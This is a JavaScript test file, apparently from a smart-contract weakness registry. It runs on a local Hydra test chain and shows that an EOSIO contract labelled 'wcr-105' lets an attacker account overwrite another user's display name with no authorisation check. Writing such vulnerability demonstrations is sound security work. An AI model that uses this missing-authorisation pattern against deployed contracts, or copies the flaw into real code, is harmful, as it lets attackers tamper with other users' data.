const { loadConfig, Blockchain } = require("@klevoya/hydra");

const config = loadConfig("hydra.yml");

describe("wcr-105", () => {
  let blockchain = new Blockchain(config);
  let vuln = blockchain.createAccount(`vulnerable`);
  let user = blockchain.createAccount(`user`);
  let attacker = blockchain.createAccount(`attacker`);

  beforeAll(async () => {
    vuln.setContract(blockchain.contractTemplates[`wcr-105`]);
    vuln.updateAuth(`active`, `owner`, {
      accounts: [
        {
          permission: {
            actor: vuln.accountName,
            permission: `eosio.code`,
          },
          weight: 1,
        },
      ],
    });
  });

  it("can update the user without the user's auth", async () => {
    expect.assertions(1);

    await vuln.contract.insert({
      user: user.accountName,
      display_name: `User 1`,
    });

    // attacker can change user1's name
    await vuln.contract.update(
      {
        user: user.accountName,
        display_name: `Evil 1`,
      },
      [{ actor: attacker.accountName, permission: `active` }]
    );

    expect(vuln.getTableRowsScoped(`user`)[vuln.accountName]).toEqual([
      {
        username: user.accountName,
        display_name: `Evil 1`
      },
    ]);
  });
});
